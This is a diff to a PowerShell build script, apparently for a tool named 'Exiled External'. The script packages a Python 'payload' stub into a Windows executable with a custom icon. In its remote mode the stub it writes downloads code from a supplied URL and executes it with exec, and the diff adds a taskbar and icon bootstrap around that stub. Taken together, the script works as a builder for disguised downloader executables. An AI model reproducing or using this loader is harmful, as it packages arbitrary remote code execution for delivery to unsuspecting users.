@@ -20,6 +20,7 @@ $StubPy  = Join-Path $WorkDir "payload.py"
 $IconRaw = Join-Path $WorkDir "icon.raw"
 $IconIco = Join-Path $WorkDir "icon.ico"
 $ExePath = Join-Path $DistDir "$OutName.exe"
+$IconDst = Join-Path $DistDir "icon.ico"
 
 function Log  { param([string]$M, [string]$C = "Cyan"); Write-Host "[$AppName] $M" -ForegroundColor $C }
 function Fail { param([string]$M); Write-Host "[$AppName] ERROR: $M" -ForegroundColor Red; exit 1 }
@@ -94,9 +95,9 @@ if (-not $PythonExe) {
     Install-Python | Out-Null
     $PythonExe = Find-Python
 }
-if (-not $PythonExe) { Fail "python not found. install python 3.11+ or pass a known path." }
+if (-not $PythonExe) { Fail "python not found." }
 & $PythonExe -c "import tkinter" 2>$null
-if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter. reinstall with tcl/tk." }
+if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter." }
 Log "python  →  $PythonExe" "Green"
 Pause-Brief
 
@@ -108,29 +109,6 @@ if (-not $NoDeps) {
 
 New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
-
-if ($Local) {
-    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
-    Copy-Item -LiteralPath $Url -Destination $StubPy -Force
-    Log "payload →  $Url (local)" "Green"
-} else {
-    Log "payload →  writing stub"
-    $body = @"
-import urllib.request
-import tkinter
-import tkinter.ttk
-import tkinter.messagebox
-import tkinter.filedialog
-import tkinter.simpledialog
-import tkinter.scrolledtext
-import tkinter.font
-import tkinter.colorchooser
-exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
-"@
-    Set-Content -Path $StubPy -Value $body -Encoding UTF8
-    Log "payload →  $Url (remote)" "Green"
-}
-Pause-Brief
 
 $useIco = $false
 if (-not $NoIcon -and $Icon) {
@@ -156,12 +134,126 @@ img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(
             $useIco = $true
             Log "icon    →  ready" "Green"
         } else {
-            Log "icon    →  conversion failed, building without" "Yellow"
+            Log "icon    →  conversion failed" "Yellow"
         }
     } catch {
-        Log "icon    →  $($_.Exception.Message), building without" "Yellow"
+        Log "icon    →  $($_.Exception.Message)" "Yellow"
     }
 }
+Pause-Brief
+
+if ($Local) {
+    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
+    Log "payload →  injecting taskbar bootstrap (local)"
+    $origBody = Get-Content -LiteralPath $Url -Raw
+    $body = @"
+import os, sys, ctypes
+from ctypes import wintypes
+
+def _exiled_taskbar():
+    try:
+        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
+            "Exiled.External.App.1")
+    except Exception:
+        pass
+    try:
+        ico = None
+        if getattr(sys, "frozen", False):
+            base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
+            for c in (os.path.join(base, "icon.ico"),
+                      os.path.join(os.path.dirname(sys.executable), "icon.ico")):
+                if os.path.exists(c):
+                    ico = c; break
+        else:
+            c = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
+            if os.path.exists(c): ico = c
+        if not ico: return
+        hb = ctypes.windll.user32.LoadImageW(None, ico, 1, 0, 0, 0x10 | 0x8000)
+        hs = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x10 | 0x8000)
+        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND,
+                                     wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
+        class WC(ctypes.Structure):
+            _fields_ = [("cbSize", wintypes.UINT), ("style", wintypes.UINT),
+                        ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
+                        ("cbWndExtra", ctypes.c_int), ("hInstance", wintypes.HINSTANCE),
+                        ("hIcon", wintypes.HICON), ("hCursor", wintypes.HANDLE),
+                        ("hbrBackground", wintypes.HBRUSH), ("lpszMenuName", wintypes.LPCWSTR),
+                        ("lpszClassName", wintypes.LPCWSTR), ("hIconSm", wintypes.HICON)]
+        wc = WC()
+        wc.cbSize = ctypes.sizeof(WC)
+        wc.lpfnWndProc = WNDPROC(lambda h,m,w,l: ctypes.windll.user32.DefWindowProcW(h,m,w,l))
+        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
+        wc.hIcon = hb; wc.hIconSm = hs
+        wc.lpszClassName = "ExiledExternalWindow"
+        ctypes.windll.user32.RegisterClassExW(ctypes.byref(wc))
+    except Exception:
+        pass
+
+_exiled_taskbar()
+$origBody
+"@
+    Set-Content -Path $StubPy -Value $body -Encoding UTF8
+} else {
+    Log "payload →  injecting taskbar bootstrap (remote)"
+    $body = @"
+import os, sys, ctypes, urllib.request
+from ctypes import wintypes
+
+def _exiled_taskbar():
+    try:
+        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
+            "Exiled.External.App.1")
+    except Exception:
+        pass
+    try:
+        ico = None
+        if getattr(sys, "frozen", False):
+            base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
+            for c in (os.path.join(base, "icon.ico"),
+                      os.path.join(os.path.dirname(sys.executable), "icon.ico")):
+                if os.path.exists(c):
+                    ico = c; break
+        else:
+            c = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
+            if os.path.exists(c): ico = c
+        if not ico: return
+        hb = ctypes.windll.user32.LoadImageW(None, ico, 1, 0, 0, 0x10 | 0x8000)
+        hs = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x10 | 0x8000)
+        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND,
+                                     wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
+        class WC(ctypes.Structure):
+            _fields_ = [("cbSize", wintypes.UINT), ("style", wintypes.UINT),
+                        ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
+                        ("cbWndExtra", ctypes.c_int), ("hInstance", wintypes.HINSTANCE),
+                        ("hIcon", wintypes.HICON), ("hCursor", wintypes.HANDLE),
+                        ("hbrBackground", wintypes.HBRUSH), ("lpszMenuName", wintypes.LPCWSTR),
+                        ("lpszClassName", wintypes.LPCWSTR), ("hIconSm", wintypes.HICON)]
+        wc = WC()
+        wc.cbSize = ctypes.sizeof(WC)
+        wc.lpfnWndProc = WNDPROC(lambda h,m,w,l: ctypes.windll.user32.DefWindowProcW(h,m,w,l))
+        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
+        wc.hIcon = hb; wc.hIconSm = hs
+        wc.lpszClassName = "ExiledExternalWindow"
+        ctypes.windll.user32.RegisterClassExW(ctypes.byref(wc))
+    except Exception:
+        pass
+
+_exiled_taskbar()
+
+import tkinter
+import tkinter.ttk
+import tkinter.messagebox
+import tkinter.filedialog
+import tkinter.simpledialog
+import tkinter.scrolledtext
+import tkinter.font
+import tkinter.colorchooser
+
+exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
+"@
+    Set-Content -Path $StubPy -Value $body -Encoding UTF8
+}
+Log "payload →  written" "Green"
 Pause-Brief
 
 Log "freeze  →  $OutName.exe"
@@ -189,11 +281,19 @@ $pyi = @(
     "--hidden-import","psutil",
     "--hidden-import","requests"
 )
-if ($useIco) { $pyi += @("--icon", $IconIco) }
+if ($useIco) {
+    $pyi += @("--icon", $IconIco)
+    $pyi += @("--add-data", "$IconIco;.")
+}
 $pyi += $StubPy
 
 & $PythonExe @pyi
 if ($LASTEXITCODE -ne 0) { Fail "pyinstaller failed" }
+
+if ($useIco -and (Test-Path $IconIco)) {
+    Copy-Item -LiteralPath $IconIco -Destination $IconDst -Force
+    Log "icon.ico → copied next to exe" "Green"
+}
 
 if (-not $KeepBuild) {
     Remove-Item -Recurse -Force $WorkDir -ErrorAction SilentlyContinue
@@ -207,6 +307,9 @@ if (Test-Path -LiteralPath $ExePath) {
     Write-Host "  ╚════════════════════════════════════════╝" -ForegroundColor Green
     Write-Host ""
     Write-Host "  path: $ExePath" -ForegroundColor DarkGray
+    if ($useIco -and (Test-Path $IconDst)) {
+        Write-Host "  icon: $IconDst" -ForegroundColor DarkGray
+    }
     Write-Host ""
 } else {
     Fail "exe not produced"
